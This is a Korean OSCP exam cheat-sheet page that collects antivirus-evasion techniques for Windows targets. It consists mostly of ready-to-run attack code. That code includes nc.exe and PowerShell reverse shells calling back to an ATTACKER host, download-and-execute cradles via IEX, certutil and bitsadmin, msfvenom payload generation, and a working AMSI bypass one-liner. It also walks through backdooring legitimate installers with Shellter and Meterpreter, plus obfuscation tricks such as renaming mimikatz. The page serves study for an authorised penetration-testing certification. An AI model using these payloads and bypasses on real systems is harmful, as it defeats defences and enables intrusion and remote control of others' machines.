---
title: "AV 우회 (AV Evasion)"
date: 2026-06-20
weight: 150
draft: false
tags: ["oscp", "cheatsheet"]
summary: "Defender가 페이로드를 막을 때 쓰는 백신 우회 기법 모음."
---

OSCP 대상에서 백신을 우회하는 기법 모음. 자주 필요하진 않지만 Defender가 페이로드를 막을 때 구해준다.

- 출처: https://heretek.dev/oscp-cheatsheet/av-evasion/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP

- 시험 규칙: 커스텀 스크립트와 수동 우회는 허용. 상용 도구(Cobalt Strike 등)는 금지.

## 빠른 의사결정 트리 (Quick Decision Tree)

```text
Payload blocked by AV?
  │
  ├── Try nc.exe first (rarely flagged)
  │     C:\Windows\Temp\nc.exe ATTACKER PORT -e cmd.exe
  │
  ├── Try PowerShell in-memory (no file on disk)
  │     powershell -e <BASE64_PAYLOAD>
  │     IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')
  │
  ├── Try Shellter (inject into legit PE)
  │     shellter → Auto → select legit .exe → inject meterpreter
  │
  └── Try manual obfuscation (rename, recompile, modify strings)
```

## 기법 1 — nc.exe 사용 (가장 간단, 먼저 시도)

nc.exe는 정상 네트워킹 도구라서 AV에 잘 걸리지 않는다.

```bash
# Host it from Kali
cp /usr/share/windows-resources/binaries/nc.exe .
python3 -m http.server 80

# Download to target
certutil -urlcache -f http://ATTACKER/nc.exe C:\Windows\Temp\nc.exe

# Execute
C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe
```

## 기법 2 — PowerShell 인메모리 실행 (디스크에 파일을 두지 않음)

AV 파일 엔진은 디스크에 닿지 않은 것을 탐지하지 못한다. PowerShell 다운로드 크래들이 메모리에서 바로 실행한다.

```powershell
# Download and execute script in memory (nothing written to disk)
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')

# Base64 encoded payload (no quoting issues, harder to signature-match)
powershell -nop -w hidden -e <BASE64_PAYLOAD>
```

base64 페이로드 생성:

```bash
# On Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f psh -o shell.ps1
cat shell.ps1 | iconv -t UTF-16LE | base64 -w 0
# Copy the output, use with: powershell -e <PASTE>
```

### PowerShell AMSI 우회 (PowerShell 자체가 막혔을 때)

AMSI(Antimalware Scan Interface)는 실행 전에 PowerShell 명령을 검사한다. 우회:

```powershell
# Simple AMSI bypass (may be patched — try variations)
$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

## 기법 3 — Shellter (정상 PE에 페이로드 주입)

Shellter는 정상 Windows 실행 파일에 쉘코드를 주입하면서 원래 기능을 유지한다.

```bash
# Install on Kali
sudo apt install shellter wine

# ARM64 Kali (Apple Silicon):
sudo dpkg --add-architecture amd64
sudo apt install -y qemu-user-static binfmt-support
sudo apt install wine32

# Run
shellter
```

절차:

1. `A` 선택 (Auto 모드)
2. 정상 32비트 Windows .exe 지정 (아무 인스톨러나 다운로드)
3. Stealth Mode 켜기 (페이로드 실행 후 원래 exe 동작을 복원)
4. 페이로드 선택: `L` (listed) → `1` (Meterpreter reverse TCP)
5. LHOST와 LPORT 설정
6. 백도어가 심어진 exe를 대상으로 전송

```bash
# Set up listener for Meterpreter
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST ATTACKER;set LPORT 443;run;"
```

- 주의: Shellter는 32비트 PE만 지원. 캐리어는 32비트 인스톨러로 받는다.
- 주의: VirusTotal에 업로드하지 않는다 — 샘플이 모든 AV 벤더에 공유된다.

## 기법 4 — 수동 난독화

미리 만든 페이로드가 걸릴 때:

```bash
# Recompile exploit from source (different compiler = different hash)
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe

# Change strings in the binary
sed -i 's/metasploit/legitimate/g' exploit.c

# UPX packing (changes hash, may bypass simple signature checks)
upx --best exploit.exe -o packed.exe

# Rename known-flagged tools
cp mimikatz.exe notepad_helper.exe
```

## 기법 5 — Living Off the Land (외부 도구 없음)

대상에 이미 있어서 AV가 걸지 않는 도구를 쓴다:

```powershell
# PowerShell reverse shell (no external binary needed)
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# certutil for file transfer (built-in, rarely blocked)
certutil -urlcache -f http://ATTACKER/file C:\Windows\Temp\file

# bitsadmin alternative
bitsadmin /transfer job /download /priority high http://ATTACKER/file C:\Windows\Temp\file
```

## AV가 문제가 아닐 때

OSCP 대상 대부분은 AV가 꺼져 있거나 최소화되어 있다. 페이로드가 안 되면:

- 아키텍처 확인 (32 vs 64비트)
- 방화벽 확인 (4444 대신 80/443 시도)
- 페이로드를 로컬에서 먼저 검증
- nc.exe 사용 — 거의 항상 된다

시험의 주제는 방법론이지 AV 우회가 아니다. nc.exe로 해결될 것을 우회에 몇 시간 쓰지 않는다.
